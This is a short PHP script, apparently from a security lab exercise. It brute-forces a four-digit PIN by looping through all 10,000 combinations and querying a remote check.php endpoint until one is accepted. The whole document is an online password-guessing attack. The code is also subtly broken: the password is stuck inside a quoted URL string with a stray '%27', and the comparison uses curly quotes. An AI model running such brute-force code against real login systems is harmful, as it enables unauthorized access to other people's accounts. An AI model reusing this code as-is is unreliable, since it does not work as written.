<?php

function check_password($password) {
    $json =
    json_decode(file_get_contents('http://supersecurelabxyz.com/check.php?pwd=%27.$password'));
    if ($json->check === ‘ok’){
     return true;
    }
    return false;
   }
   for ($i=0;$i<=9;$i++){
    for ($j=0;$j<=9;$j++){
     for ($k=0;$k<=9;$k++){
      for ($l=0;$l<=9;$l++){
       $password = $i.$j.$k.$l;
       if (check_password($password) === true){
        echo $password;
        exit;
       }
      }
     }
    }
   }

?>